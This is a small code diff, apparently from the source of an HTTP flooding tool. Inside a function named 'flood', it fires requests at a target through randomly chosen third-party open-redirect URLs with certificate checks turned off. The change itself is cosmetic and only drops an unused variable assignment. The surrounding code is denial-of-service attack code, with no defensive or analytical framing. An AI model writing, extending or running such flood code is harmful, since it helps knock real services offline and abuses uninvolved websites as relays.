@@ -43,7 +43,7 @@ def flood(attack_id, url, stoptime) -> None:
             url_final = utils().buildblock(url)
             vuln_url = choice(openredirects).replace('$BASE64TARGET', b64encode(url_final.encode()).decode()).replace('$TARGET', url_final)
 
-            req = Core.session.get(
+            Core.session.get(
                 vuln_url, 
                 headers=utils().buildheaders(url),
                 verify=False, 
